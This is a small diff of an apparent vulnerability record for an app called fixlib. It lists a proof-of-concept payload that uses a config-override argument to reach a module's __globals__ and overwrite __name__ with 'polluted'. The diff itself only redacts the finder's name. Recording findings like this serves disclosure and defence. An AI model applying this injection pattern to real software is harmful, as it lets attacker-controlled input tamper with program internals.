@@ -8,7 +8,7 @@
 + CVE: N/A
 + Status: Pending
 + Payload: ```ArgumentParser.args.config_override = ["configtest.__init__.__globals__.__name__=polluted"]; fixlib.config.Config.override_config(running_config)```
-+ Foundby: Zhong
++ Foundby: redacted
 + Report: Pending
 + Type: App
 + Exploitability: Low
